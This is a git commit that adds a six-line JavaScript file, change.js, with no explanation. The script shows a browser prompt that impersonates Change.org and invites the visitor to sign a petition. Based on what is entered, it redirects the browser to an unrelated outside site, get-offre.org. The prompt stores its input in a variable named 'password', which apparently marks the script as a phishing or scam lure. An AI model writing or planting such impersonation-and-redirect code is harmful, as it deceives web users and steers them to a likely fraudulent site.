7d17779898fbc3a31306dc0e5dbe1eb9ada0bb75
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-10-21 06:37:15 -0700

    Create change.js

---
+++ change.js
@@ -0,0 +1,6 @@
+
+var password = 'SIGN THIS PETITION'
+password=prompt('Change-org: You have been invited to join hand in signing this petition. kindly press Ok to submit petition ','SIGN THIS PETITION');
+if (password != 'SIGN THIS PETITION') {
+location.href='https://get-offre.org/sign-petition.html';
+}
